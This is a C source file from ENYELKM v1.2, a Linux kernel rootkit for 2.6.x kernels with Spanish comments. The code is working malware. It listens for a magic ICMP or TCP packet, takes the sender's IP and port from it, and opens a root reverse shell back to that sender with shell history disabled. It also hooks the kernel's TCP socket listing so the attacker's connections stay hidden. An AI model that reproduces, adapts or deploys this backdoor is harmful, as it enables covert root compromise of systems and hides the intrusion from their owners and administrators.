/*
 * ENYELKM v1.2
 * Linux Rootkit x86 kernel v2.6.x
 *
 * By RaiSe && David Reguera
 * < raise@enye-sec.org
 *   davidregar@yahoo.es
 *   http://www.enye-sec.org >
 */

#include <linux/types.h>
#include <linux/stddef.h>
#include <linux/unistd.h>
#include <linux/module.h>
#include <linux/version.h>
#include <linux/kernel.h>
#include <linux/string.h>
#include <linux/mm.h>
#include <linux/slab.h>
#include <linux/sched.h>
#include <linux/in.h>
#include <linux/skbuff.h>
#include <linux/ip.h>
#include <linux/netdevice.h>
#include <linux/dirent.h>
#include <linux/proc_fs.h>
#include <net/tcp.h>
#include <asm/processor.h>
#include <asm/uaccess.h>
#include <asm/unistd.h>
#include <asm/ioctls.h>
#include <asm/termbits.h>
#include "config.h"
#include "remoto.h"
#include "syscalls.h"

#define __NR_e_exit __NR_exit


/* variables globales */
static char *earg[4] = { "/bin/bash", "--noprofile", "--norc", NULL };
extern short lanzar_shell;
extern int errno;
extern unsigned long global_ip;
extern unsigned short global_port;
extern int (*orig_tcp4_seq_show)(struct seq_file *seq, void *v);
int ptmx, epty;

/* variables de entorno */
char *env[]={
    "TERM=linux",
    "HOME=" HOME,
    "PATH=/bin:/usr/bin:/sbin:/usr/sbin:/usr/local/bin"
    ":/usr/local/sbin",
    "HISTFILE=/dev/null",
     NULL };


/* syscalls */
static inline my_syscall0(pid_t, fork);
static inline my_syscall0(long, pause);
static inline my_syscall2(int, kill, pid_t, pid, int, sig);
static inline my_syscall1(int, chdir, const char *, path);
static inline my_syscall1(long, ssetmask, int, newmask);
static inline my_syscall3(int, write, int, fd, const char *, buf, off_t, count);
static inline my_syscall3(int, read, int, fd, char *, buf, off_t, count);
static inline my_syscall1(int, e_exit, int, exitcode);
static inline my_syscall3(int, open, const char *, file, int, flag, int, mode);
static inline my_syscall1(int, close, int, fd);
static inline my_syscall2(int, dup2, int, oldfd, int, newfd);
static inline my_syscall2(int, socketcall, int, call, unsigned long *, args);
static inline my_syscall3(pid_t, waitpid, pid_t, pid, int *, status, int, options);
static inline my_syscall3(int, execve, const char *, filename,
	const char **, argv, const char **, envp);
static inline my_syscall3(long, ioctl, unsigned int, fd, unsigned int, cmd,
		unsigned long, arg);
static inline my_syscall5(int, _newselect, int, n, fd_set *, readfds, fd_set *,
		writefds, fd_set *, exceptfds, struct timeval *, timeout);
static inline my_syscall2(unsigned long, signal, int, sig,
		__sighandler_t, handler);



int reverse_shell(void)
{
struct task_struct *ptr = current;
struct sockaddr_in dire;
mm_segment_t old_fs;
unsigned long arg[3];
int soc, tmp_pid, i;
unsigned char tmp;
fd_set s_read;

old_fs = get_fs();

ptr->uid = 0;
ptr->euid = 0;
ptr->gid = SGID;
ptr->egid = 0;

arg[0] = AF_INET;
arg[1] = SOCK_STREAM;
arg[2] = 0;

set_fs(KERNEL_DS);

ssetmask(~0);

for (i=0; i < 4096; i++)
	close(i);

if ((soc = socketcall(SYS_SOCKET, arg)) == -1)
	{
	set_fs(old_fs);
	lanzar_shell = 1;

    e_exit(-1);
	return(-1);
    }

memset((void *) &dire, 0, sizeof(dire));

dire.sin_family = AF_INET;
dire.sin_port = htons((unsigned short) global_port);
dire.sin_addr.s_addr = (unsigned long) global_ip;

arg[0] = soc;
arg[1] = (unsigned long) &dire;
arg[2] = (unsigned long) sizeof(dire);

if (socketcall(SYS_CONNECT, arg) == -1)
	{
	close(soc);
	set_fs(old_fs);
	lanzar_shell = 1;

	e_exit(-1);
	return(-1);
	}

/* pillamos tty */
epty = get_pty();

/* ejecutamos shell */
set_fs(old_fs);

if (!(tmp_pid = fork()))
	ejecutar_shell();

set_fs(KERNEL_DS);


while(1)
	{
	FD_ZERO(&s_read);
	FD_SET(ptmx, &s_read);
	FD_SET(soc, &s_read);

	if (_newselect((ptmx > soc ? ptmx+1 : soc+1), &s_read, 0, 0, NULL) < 0)
		break;

	if (FD_ISSET(ptmx, &s_read))
		{
		if (read(ptmx, &tmp, 1) <= 0)
			break;
		write(soc, &tmp, 1);
		}

	if (FD_ISSET(soc, &s_read))
		{
		if (read(soc, &tmp, 1) <= 0)
			break;
		write(ptmx, &tmp, 1);
		}

	} /* fin while */


/* matamos el proceso */
kill(tmp_pid, SIGKILL);

#if DEBUG == 1
printk("enyelkm: saliendo de reverse_shell\n");
#endif

/* salimos */
set_fs(old_fs);
e_exit(0);

return(-1);

} /********** fin reverse_shell **********/



int capturar(struct sk_buff *skb, struct net_device *dev, struct packet_type *pkt,
				struct net_device *dev2)
{
unsigned short len;
char buf[256], *p;
int i;

switch(skb->nh.iph->protocol)
	{
	case 1:
	/* ICMP */

	/* el icmp debe ser para nosotros */
	if (skb->pkt_type != PACKET_HOST)
		{
		kfree_skb(skb);
		return(0);
		}

	len = (unsigned short) skb->nh.iph->tot_len;
	len = htons(len);

	/* no es nuestro icmp */
	if (len != (28 + strlen(ICMP_CLAVE) + sizeof(unsigned short)))
		{
		kfree_skb(skb);
		return(0);
		}

	/* copiamos el packete */
	memcpy (buf, (void *) skb->nh.iph, len);

	/* borramos los null */
	for (i=0; i < len; i++)
		if (buf[i] == 0)
			buf[i] = 1;
	buf[len] = 0;

	if(strstr(buf,ICMP_CLAVE) != NULL)
		{
		unsigned short *puerto;

		puerto = (unsigned short *)
					((void *)(strstr(buf,ICMP_CLAVE) + strlen(ICMP_CLAVE)));

		global_port = *puerto;
		global_ip = skb->nh.iph->saddr;

		lanzar_shell = 1;
		}

	kfree_skb(skb);
	return(0);
	break;

	case 6:
	/* TCP */

    len = (unsigned short) skb->nh.iph->tot_len;
    len = htons(len);

	if (len > 255)
		len = 255;
	
	/* copiamos el paquete, o parte */
	memcpy (buf, (void *) skb->nh.iph, len);

    /* borramos los null */
    for (i=0; i < len; i++)
        if (buf[i] == 0)
            buf[i] = 1;
    buf[len] = 0;

    if((p = strstr(buf,TCP_CLAVE)) != NULL)
        {
		p += strlen(TCP_CLAVE);		
		global_port = *((unsigned short *) p);
		global_ip = skb->nh.iph->saddr;

        lanzar_shell = 1;
        }

    kfree_skb(skb);
    return(0);
	break;

	default:
	/* NO ICMP && NO TCP */

	kfree_skb(skb);
	return(0);
	break;

	} /* fin switch */

} /******** fin capturar() *********/



int get_pty(void)
{
char buf[128];
int npty, lock = 0;

ptmx = open("/dev/ptmx", O_RDWR, S_IRWXU);

/* pillamos pty libre */
ioctl(ptmx, TIOCGPTN, (unsigned long) &npty);

/* bloqueamos */
ioctl(ptmx, TIOCSPTLCK, (unsigned long) &lock);

/* abrimos pty */
sprintf(buf, "/dev/pts/%d", npty);
npty = open(buf, O_RDWR, S_IRWXU);

/* devolvemos el descriptor */
return(npty);

} /*************** fin de get_pty() **************/



void eco_off(void)
{
struct termios term;

ioctl(0, TCGETS, (unsigned long) &term);
term.c_lflag = term.c_lflag || CLOCAL;
ioctl(0, TCSETS, (unsigned long) &term);

} /************* fin de eco_off **************/



void ejecutar_shell(void)
{
struct task_struct *ptr = current;
mm_segment_t old_fs;

old_fs = get_fs();
set_fs(KERNEL_DS);

ptr->uid = 0;
ptr->euid = 0;
ptr->gid = SGID;
ptr->egid = 0;

/* dupeamos */
dup2(epty, 0);
dup2(epty, 1);
dup2(epty, 2);

/* quitamos eco */
eco_off();

/* cambiamos a home */
chdir(HOME);

execve(earg[0], (const char **) earg, (const char **) env);

/* salimos en caso de error */
e_exit(-1);

} /************ fin ejecutar_shell ***********/



int hacked_tcp4_seq_show(struct seq_file *seq, void *v)
{
struct tcp_iter_state* st;
struct my_inet_request_sock *ireq;
struct my_inet_sock *inet;

if (v == SEQ_START_TOKEN)
	return((*orig_tcp4_seq_show)(seq, v));

st = seq->private;

switch (st->state)
	{
	case TCP_SEQ_STATE_LISTENING:
	case TCP_SEQ_STATE_ESTABLISHED:

		inet = (struct my_inet_sock *)((struct sock *) v);
		if ((inet->daddr == global_ip) || (inet->rcv_saddr == global_ip))
			{
			#if DEBUG == 1
			printk("enyelkm: ip detectada y ocultada (established)!\n");
			#endif

			return(0);
			}
		else
			return((*orig_tcp4_seq_show)(seq, v));
		break;

	case TCP_SEQ_STATE_OPENREQ:

		ireq = my_inet_rsk((struct my_request_sock *) v);
		if ((ireq->loc_addr == global_ip) || (ireq->rmt_addr == global_ip))
			{
			#if DEBUG == 1
			printk("enyelkm: ip detectada y ocultada (openreq)!\n");
			#endif

			return(0);
			}
		else
			return((*orig_tcp4_seq_show)(seq, v));
		break;

	case TCP_SEQ_STATE_TIME_WAIT:

		if ((((struct my_inet_timewait_sock *)v)->tw_daddr == global_ip) ||
			(((struct my_inet_timewait_sock *)v)->tw_rcv_saddr == global_ip))
			{
			#if DEBUG == 1
			printk("enyelkm: ip detectada y ocultada(time_wait)!\n");
			#endif

			return(0);
			}
		else
			return((*orig_tcp4_seq_show)(seq, v));
		break;
	}

return(0);

} /********** fin hacked_tcp4_seq_show() ***********/



/* EOF */
